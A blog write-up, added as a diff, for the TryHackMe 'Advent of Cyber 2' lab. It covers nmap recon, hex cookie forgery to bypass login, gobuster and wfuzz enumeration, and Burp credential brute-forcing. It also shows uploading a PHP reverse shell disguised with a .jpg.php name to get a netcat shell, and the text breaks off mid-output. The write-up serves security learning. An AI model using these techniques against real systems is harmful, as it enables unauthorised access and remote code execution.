@@ -1,0 +1,479 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.0"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Writeup for TryHackMe room - Advent of Cyber 2" /><meta name="author" content="4n3i5v74" /><meta property="og:locale" content="en_US" /><meta name="description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><meta property="og:description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><link rel="canonical" href="https://4n3i5v74.github.io/posts/tryhackme-advent-of-cyber-2/" /><meta property="og:url" content="https://4n3i5v74.github.io/posts/tryhackme-advent-of-cyber-2/" /><meta property="og:site_name" content="4n3i5v74" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-04T00:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Writeup for TryHackMe room - Advent of Cyber 2" /><meta name="twitter:site" content="@nive1103" /><meta name="twitter:creator" content="@4n3i5v74" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"4n3i5v74"},"headline":"Writeup for TryHackMe room - Advent of Cyber 2","dateModified":"2021-05-13T23:09:48+05:30","datePublished":"2021-05-04T00:00:00+05:30","description":"A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups.","url":"https://4n3i5v74.github.io/posts/tryhackme-advent-of-cyber-2/","mainEntityOfPage":{"@type":"WebPage","@id":"https://4n3i5v74.github.io/posts/tryhackme-advent-of-cyber-2/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>Writeup for TryHackMe room - Advent of Cyber 2 | 4n3i5v74</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/local.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/copy-code.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">4n3i5v74</a></div><div class="site-subtitle font-italic">A Security Blog.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/4n3i5v74" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span>Posts</span> <span>Writeup for TryHackMe room - Advent of Cyber 2</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Writeup for TryHackMe room - Advent of Cyber 2</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, May 4, 2021, 12:00 AM +0530" > May 4 <i class="unloaded">2021-05-04T00:00:00+05:30</i> </span> by <span class="author"> 4n3i5v74 </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, May 13, 2021, 11:09 PM +0530" > May 13 <i class="unloaded">2021-05-13T23:09:48+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3552 words">19 min</span></div></div><div class="post-content"><div class="flex-container"> <script src="https://tryhackme.com/badge/34685"></script></div><h2 id="advent-of-cyber-2"><a href="https://tryhackme.com/room/adventofcyber2" target="_blank">Advent of Cyber 2</a></h2><p>This room contains info and methods to recon and enumerate network captures, protocols, web servers, databases, binaries and SUID, privilege escalations, osint, cloud and encryption.</p><p>For complete tryhackme path, refer the <a href="https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/" target="_blank">link</a></p><h2 id="task-6---day-1---web-exploitation---a-christmas-crisis">Task 6 - Day 1 - Web Exploitation - A Christmas Crisis</h2><p>This task is about using <code>nmap</code> to get web service info and using cookie manipulation to bypass login.</p><h3 id="references">References</h3><ul><li><a href="https://www.youtube.com/watch?v=BJF84oWHmok&amp;ab_channel=JohnHammond" target="_blank">TryHackMe supporting material</a><li><a href="https://4n3i5v74.github.io/posts/cheatsheet-nmap/" target="_blank">NMAP Reference</a><li><a href="https://gchq.github.io/CyberChef/" target="_blank">Cyberchef</a></ul><p>Using <code>nmap</code>, perform basic recon and get listening ports.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nmap%20-Pn%20-T4%20-sS%20--reason%20--open%20-F%20%3Cip%3E" type="button"></button></div></div><pre><code>nmap -Pn -T4 -sS --reason --open -F &lt;ip&gt;
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20Nmap%207.60%20(%20https://nmap.org%20)%20at%202021-01-15%2003:27%20GMT%0A%0ANmap%20scan%20report%20for%20%3Chostname%3E%20(%3Cip%3E)%0AHost%20is%20up,%20received%20arp-response%20(0.00070s%20latency).%0ANot%20shown:%2098%20filtered%20ports,%201%20closed%20port%0AReason:%2088%20no-responses,%2010%20admin-prohibiteds%20and%201%20reset%0ASome%20closed%20ports%20may%20be%20reported%20as%20filtered%20due%20to%20--defeat-rst-ratelimit%0APORT%20%20%20STATE%20SERVICE%20REASON%0A80/tcp%20open%20%20http%20%20%20%20syn-ack%20ttl%2064%0AMAC%20Address:%2002:35:FC:72:6D:75%20(Unknown)%0A%0ANmap%20done:%201%20IP%20address%20(1%20host%20up)%20scanned%20in%205.40%20seconds" type="button"></button></div></div><pre><code>Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-15 03:27 GMT
+
+Nmap scan report for &lt;hostname&gt; (&lt;ip&gt;)
+Host is up, received arp-response (0.00070s latency).
+Not shown: 98 filtered ports, 1 closed port
+Reason: 88 no-responses, 10 admin-prohibiteds and 1 reset
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 64
+MAC Address: 02:35:FC:72:6D:75 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 5.40 seconds
+</code></pre><p>Use <code>firefox</code> to register and login.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="http://%3Cip%3E%0A%20%20-%20register%0A%20%20%20%20-%20login" type="button"></button></div></div><pre><code>http://&lt;ip&gt;
+  - register
+    - login
+</code></pre><p>Use <code>firefox</code> to inspect cookie after logging in.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="http://%3Cip%3E%0A%20%20-%20login%0A%20%20%20%20-%20inspect%20page%0A%20%20%20%20-%20storage%0A%20%20%20%20%20%20-%20cookie%20(auth)" type="button"></button></div></div><pre><code>http://&lt;ip&gt;
+  - login
+    - inspect page
+    - storage
+      - cookie (auth)
+</code></pre><p>The cookie will have numbers <code>0-9</code> and letters <code>a-f</code>, which denotes it is a hexadecimal encoded string. Using <code>cyberchef</code> from <code>firefox</code> the same can be decoded.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="From%20Hex%0A%20%20-%20Input%20-%20%3Chex-code%3E" type="button"></button></div></div><pre><code>From Hex
+  - Input - &lt;hex-code&gt;
+</code></pre><p>There will be a <code>json</code> output obtained from encoded hex code.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="%7B%22company%22:%22The%20Best%20Festival%20Company%22,%20%22%3Ckey%3E%22:%22%3Cvalue%3E%22%7D" type="button"></button></div></div><pre><code>{"company":"The Best Festival Company", "&lt;key&gt;":"&lt;value&gt;"}
+</code></pre><p>Use <code>cyberchef</code> to manipulate hex decoded value and create new encoded hex data.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="To%20Hex%0A%20%20-%20Input%20-%20%3Chex-value%3E" type="button"></button></div></div><pre><code>To Hex
+  - Input - &lt;hex-value&gt;
+</code></pre><p>Use <code>firefox</code> to login and send new manipulated cookie.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="http://%3Cip%3E%0A%20%20-%20login%0A%20%20%20%20-%20inspect%20page%0A%20%20%20%20-%20storage%0A%20%20%20%20%20%20-%20cookie%20(auth)%0A%20%20%20%20%20%20-%20replace%20existing%20value%20with%20manipulated%20hex%20code%0A%20%20-%20reload%0A%20%20%20%20-%20activate%20all%20controls%0A%20%20%20%20-%20%3Cflag%3E" type="button"></button></div></div><pre><code>http://&lt;ip&gt;
+  - login
+    - inspect page
+    - storage
+      - cookie (auth)
+      - replace existing value with manipulated hex code
+  - reload
+    - activate all controls
+    - &lt;flag&gt;
+</code></pre><h2 id="task-7---day-2---web-exploitation---the-elf-strikes-back">Task 7 - Day 2 - Web Exploitation - The Elf Strikes Back</h2><p>This task is about using <code>gobuster</code> to brute-force upload directory and upload <code>php-reverse-shell</code> to gain shell access from web site.</p><h3 id="references-1">References</h3><ul><li><a href="https://www.youtube.com/watch?v=F_nTIX-q32k&amp;" target="_blank">TryHackMe supporting material</a><li><a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-gobuster" target="_blank">Gobuster Reference</a><li><a href="https://4n3i5v74.github.io/posts/cheatsheet-gobuster/" target="_blank">Gobuster Reference</a><li><a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" target="_blank">PHP Reverse Shell</a></ul><p>Use <code>firefox</code> to append ID <code>ODIzODI5MTNiYmYw</code> and access the upload page.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="http://%3Cip%3E/?id=ODIzODI5MTNiYmYw%0A%20%20-%20inspect%20page" type="button"></button></div></div><pre><code>http://&lt;ip&gt;/?id=ODIzODI5MTNiYmYw
+  - inspect page
+</code></pre><p>The source code contains a hint <code>&lt;input type="file" id="chooseFile" accept=".jpeg,.jpg,.png"&gt;</code> of file extensions which are accepted for uploads.</p><p>Use <code>gobuster</code> to get directories that store uploaded files. Check the redirected entry from the output.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="gobuster%20dir%20-u%20%3Cip%3E%20-w%20/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt%20-q%20--wildcard%20%7C%20grep%20upload" type="button"></button></div></div><pre><code>gobuster dir -u &lt;ip&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -q --wildcard | grep upload
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="/%3Cdir%3E%20(Status:%20301)" type="button"></button></div></div><pre><code>/&lt;dir&gt; (Status: 301)
+</code></pre><p>Download <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" target="_blank">php-reverse-shell</a> or copy from kali webshells.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="cp%20/usr/share/webshells/php/php-reverse-shell.php%20php-reverse-shell.jpg.php" type="button"></button></div></div><pre><code>cp /usr/share/webshells/php/php-reverse-shell.php php-reverse-shell.jpg.php
+</code></pre><p>Edit the <code>php-reverse-shell</code> file and update the localhost ip.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="vim%20php-reverse-shell.jpg.php%0A$ip%20=%20'%3Clocal-ip%3E'" type="button"></button></div></div><pre><code>vim php-reverse-shell.jpg.php
+$ip = '&lt;local-ip&gt;'
+</code></pre><p>Create a <code>netcat</code> reverse shell to listen from the php reverse shell payload.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-lnvp%201234" type="button"></button></div></div><pre><code>nc -lnvp 1234
+</code></pre><p>Use <code>firefox</code> to upload the modified <code>php-reverse-shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="http://%3Cip%3E/?id=ODIzODI5MTNiYmYw%0A%20%20-%20select%0A%20%20%20%20-%20php-reverse-shell.jpg.php%0A%20%20%20%20-%20submit" type="button"></button></div></div><pre><code>http://&lt;ip&gt;/?id=ODIzODI5MTNiYmYw
+  - select
+    - php-reverse-shell.jpg.php
+    - submit
+</code></pre><p>An output similar to below will be obtained in the <code>netcat</code> reverse shell session. Check contents of file <code>/var/www/flag.txt</code> for the flag.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Listening%20on%20[0.0.0.0]%20(family%200,%20port%201234)%0AConnection%20from%20%3Cip%3E%2045520%20received!%0ALinux%20security-server%204.18.0-193.28.1.el8_2.x86_64%20#1%20SMP%20Thu%20Oct%2022%2000:20:22%20UTC%202020%20x86_64%20x86_64%20x86_64%20GNU/Linux%0A12:18:09%20up%20%201:44,%20%200%20users,%20%20load%20average:%200.00,%201.24,%201.59%0AUSER%20%20%20%20%20TTY%20%20%20%20%20%20FROM%20%20%20%20%20%20%20%20%20%20%20%20%20LOGIN@%20%20%20IDLE%20%20%20JCPU%20%20%20PCPU%20WHAT%0Auid=48(apache)%20gid=48(apache)%20groups=48(apache)%0A%0Ash-4.4$%20cat%20/var/www/flag.txt%0Acat%20/var/www/flag.txt%0A%20%20%3Cflag%3E" type="button"></button></div></div><pre><code>Listening on [0.0.0.0] (family 0, port 1234)
+Connection from &lt;ip&gt; 45520 received!
+Linux security-server 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+12:18:09 up  1:44,  0 users,  load average: 0.00, 1.24, 1.59
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+
+sh-4.4$ cat /var/www/flag.txt
+cat /var/www/flag.txt
+  &lt;flag&gt;
+</code></pre><h2 id="task-8---day-3---web-exploitation---christmas-chaos">Task 8 - Day 3 - Web Exploitation - Christmas Chaos</h2><p>This task is about using <code>burpsuite</code> to brute-force payloads using commonly used usernames and passwords.</p><h3 id="references-2">References</h3><ul><li><a href="https://www.youtube.com/watch?v=cQq6xPCZFjg&amp;" target="_blank">TryHackMe supporting material</a></ul><p>Use <code>burpsuite</code> to manipulate login credentials.</p><ul><li>Open <code>firefox</code> and set proxy <code>127.0.0.1:8080</code><li>Open <code>burpsuite</code> and turn <code>intercept on</code><li>Use <code>firefox</code> to login to <code>http://&lt;ip&gt;</code> using any dummy credentials<li>In <code>Burpsuite</code>, in <code>proxy</code> tab, select the content and <code>send to intruder</code><li>In <code>Burpsuite</code>, in <code>intruder</code> tab, and in <code>positions</code> tab, select <code>username</code> and <code>password</code>, select <code>cluster bomb</code><li>In <code>Burpsuite</code>, in <code>intruder</code> tab, and in <code>payloads</code> tab, in <code>set 1</code>, add <code>root</code>, <code>admin</code>, and <code>user</code>, and in <code>set 2</code>, add <code>password</code>, <code>admin and </code>12345<code>, and </code>start attack`<li>From the results in <code>Burpsuite</code>, get the credentials and login to <code>http://&lt;ip&gt;</code> using <code>firefox</code> to get the <code>flag</code><li>Quit <code>burpsuite</code> and reverse proxy setting in <code>firefox</code></ul><h2 id="task-9---day-4---web-exploitation---santas-watching">Task 9 - Day 4 - Web Exploitation - Santa’s Watching</h2><p>This task is about using <code>gobuster</code> to find hidden directory containing backups and using <code>wfuzz</code> to fuzz out page containing valid backup files.</p><h3 id="references-3">References</h3><ul><li><a href="https://www.youtube.com/watch?v=7GAFQdYCk5s" target="_blank">TryHackMe supporting material</a><li><a href="https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist" target="_blank">TryHackMe supporting wordlist</a><li><a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-gobuster" target="_blank">Gobuster Reference</a><li><a href="https://4n3i5v74.github.io/posts/cheatsheet-gobuster/" target="_blank">Gobuster Reference</a><li><a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#wordlists---rockyou" target="_blank">Wordlist Reference</a></ul><p>Use <code>firefox</code> to check the website <code>http://&lt;ip&gt;</code>.</p><p>Using <code>gobuster</code> and <code>dirb</code> wordlists, find the child directories under web root.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="gobuster%20dir%20-u%20http://%3Cip%3E%20-w%20/usr/share/wordlists/dirb/big.txt%20-q%20--wildcard" type="button"></button></div></div><pre><code>gobuster dir -u http://&lt;ip&gt; -w /usr/share/wordlists/dirb/big.txt -q --wildcard
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="/.htpasswd%20(Status:%20403)%0A/.htaccess%20(Status:%20403)%0A/LICENSE%20(Status:%20200)%0A/%3Cdir%3E%20(Status:%20301)%0A/server-status%20(Status:%20403)" type="button"></button></div></div><pre><code>/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/LICENSE (Status: 200)
+/&lt;dir&gt; (Status: 301)
+/server-status (Status: 403)
+</code></pre><p>Use <code>firefox</code> to check the website <code>http://&lt;ip&gt;/&lt;dir&gt;</code>. There will be a file <code>site-log.php</code> available.</p><p>Use <code>wget</code> to download the custom wordlist and perform date fuzzing using <code>wfuzz</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="wget%20https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist%0Awfuzz%20-c%20-z%20file,wordlist%20http://%3Cip%3E/%3Cdir%3E/site-log.php?date=FUZZ" type="button"></button></div></div><pre><code>wget https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist
+wfuzz -c -z file,wordlist http://&lt;ip&gt;/&lt;dir&gt;/site-log.php?date=FUZZ
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="*%20Wfuzz%202.2.9%20-%20The%20Web%20Fuzzer%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*%0A%0ATarget:%20http://%3Cip%3E/%3Cdir%3E/site-log.php?date=FUZZ%0ATotal%20requests:%2063%0A%0AID%09Response%20%20%20Lines%20%20%20%20%20%20Word%20%20%20%20%20%20%20%20%20Chars%20%20%20%20%20%20%20%20%20%20Payload%0A%0A000018:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201117%22%0A000019:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201118%22%0A000021:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201120%22%0A000020:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201119%22%0A000022:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201121%22%0A000023:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201122%22%0A000024:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201123%22%0A000025:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201124%22%0A000026:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%201%20W%09%20%20%20%20%2013%20Ch%09%20%20%2220201125%22%0A000027:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201126%22%0A000028:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201127%22%0A000029:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201128%22%0A000030:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201129%22%0A000031:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201130%22%0A000032:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201201%22%0A000033:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201202%22%0A000034:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201203%22%0A000035:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201204%22%0A000036:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201205%22%0A000038:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201207%22%0A000037:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201206%22%0A000039:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201208%22%0A000049:%20%20